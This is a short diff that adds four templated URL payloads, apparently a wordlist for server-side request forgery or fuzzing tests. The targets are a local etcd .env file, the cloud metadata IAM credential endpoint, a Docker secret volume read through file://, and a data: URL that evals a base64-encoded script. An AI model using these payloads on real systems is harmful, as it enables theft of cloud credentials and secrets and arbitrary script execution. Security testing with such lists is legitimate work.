@@ -1,0 +1,4 @@
+http://127.0.0.1:2379/.env?{{RANDOM}}
+http://169.254.169.254/latest/meta-data/iam/?sig={{RANDOM_SIG}}
+file:///var/lib/docker/volumes/secret_data/_data
+data:text/html,<script>eval(atob('{{RANDOM_B64_JS}}'))</script>
